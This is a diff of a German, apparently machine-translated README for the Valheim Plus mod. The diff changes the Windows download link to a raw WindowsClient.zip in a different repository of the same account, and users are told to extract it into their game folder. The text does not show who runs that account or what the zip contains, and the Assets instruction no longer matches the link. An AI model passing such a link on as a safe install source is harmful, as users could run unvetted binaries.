@@ -170,7 +170,7 @@ Detaillierte Installationsanleitungen finden Sie [auf unserer Website] (https://
 ## **Windows**
 ### Spiel (Dampf)
 
-1. Laden Sie das [neueste Paket namens WindowsClient.zip über diesen Link] herunter (https://github.com/paulagents/valheim_plus/raw/main/WindowsClient.zip). *(Scrollen Sie nach unten und klicken Sie auf "Assets")*
+1. Laden Sie das [neueste Paket namens WindowsClient.zip über diesen Link] herunter (https://github.com/paulagents/Valheim-Plus-Server/raw/main/WindowsClient.zip). *(Scrollen Sie nach unten und klicken Sie auf "Assets")*
 2. Suchen Sie Ihren Spieleordner manuell oder starten Sie den Steam-Client und klicken Sie mit der rechten Maustaste auf das Valheim-Spiel in Ihrer Steam-Bibliothek und wählen Sie Verwalten -> Durchsuchen Sie lokale Dateien nach Steam, um Ihren Spieleordner zu öffnen.
 3. Extrahieren Sie den Inhalt der .zip-Datei in den Spielordner.
 4. Öffnen Sie valheim_plus.cfg unter BepInEx\config mit einem beliebigen Texteditor und konfigurieren Sie die Mod nach Ihren Bedürfnissen.
